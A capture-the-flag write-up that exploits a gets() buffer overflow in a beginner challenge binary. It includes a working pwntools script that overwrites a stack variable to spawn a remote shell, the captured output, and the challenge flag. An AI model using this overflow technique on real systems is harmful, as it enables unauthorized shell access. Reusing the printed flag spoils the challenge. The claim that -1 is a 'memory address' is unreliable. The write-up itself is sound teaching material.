# pwn/beginner-generic-pwn-number-0
Author: pepsipu

rob keeps making me write beginner pwn! i'll show him...

```nc mc.ax 31199```

# Solution

For beginner pwn challenges, they are usually some type of buffer overflow challenges.

Analyzing the c code they gave to us, we see that it is a buffer overflow exploit from the line, gets(heartfelt_message);

gets is a c function that is very vulnerable to many types of buffer overflow exploits.

Taking a look at the rest of the code, something else seems very interesting.

The lines, 
  if(inspirational_message_index == -1) {
    system("/bin/sh");
  }
}

We see that the another variable is being compared in order to get a shell and not our input variable.

Let's now take a look at the main function in ghidra.

```
undefined8 main(void)

{
  uint uVar1;
  time_t tVar2;
  char local_38 [40];
  ulong local_10;
  
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  uVar1 = rand();
  local_10 = (ulong)(uVar1 & 1);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts(*(char **)(inspirational_messages + local_10 * 8));
  puts(
      "rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!"
      );
  puts("can you write me a heartfelt message to cheer me up? :(");
  gets(local_38);
  if (local_10 == 0xffffffffffffffff) {
    system("/bin/sh");
  }
  return 0;
}
```
Looking at the main function in ghidra, we see some things that are useful to us that we couldn't see in the c code provided.

We see that instead of that other variable being compared to a -1, it is compared to a memory address.

Now we know that we need to get to this memory address.

Now we just have to find the offset. 

Looking at the ghidra code we see that 40 bytes are assigned.

```Idk why for some reason but ghidra gives more accurate byte readings```

Now that we know that the offset is 40 bytes, lets make a python script to get into this shell.

We will be using pwntools.

The script I made looks like this:

```
from pwn import *

exe = ELF("beginner-generic-pwn-number-0")

context.binary = exe


def conn():
        if False:
                return process([exe.path])
        else:
                return remote("mc.ax", 31199)


def main():
        r = conn()
        r.recvuntil("can you write me a heartfelt message to cheer me up? :(")
        r.sendline(b"A"*40 + p64(0xffffffffffffffff))
        r.interactive()


if __name__ == "__main__":
        main()
```

The top part of the script is mostly just connecting to their server using the credentials they provided with the netcat.

Inside the main, we first receieve a connection from the server, wait until we get the message from the server before we put input (Not needed), then we send our payload and get into interactive mode, which just means we get into a shell. 

If we are in interactive and get a EOF, which means End of File, something is wrong.

Let's take a look at the payload.

Basically, we just fill up the first 40 bytes by doing 40 A's first then we use p64 which packs the bytes so we dont have to do \xff\xff\xff\xff\xff\xff\xff\xff. (They are the same thing)

Now that we sent it to that address, we should be getting a shell from their server if we run the program.

```
python3 buffer-overflow.py                                                                   
[*] '/home/kali/Downloads/beginner-generic-pwn-number-0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mc.ax on port 31199: Done
[*] Switching to interactive mode

$ ls
flag.txt
run
$ cat flag.txt
flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
[*] Got EOF while reading in interactive
$  
```

And we do get a shell from their server.

We print out the flag.txt file using cat and get the flag.

Don't worry about the EOF now we already got the flag.

# Flag
```flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}```
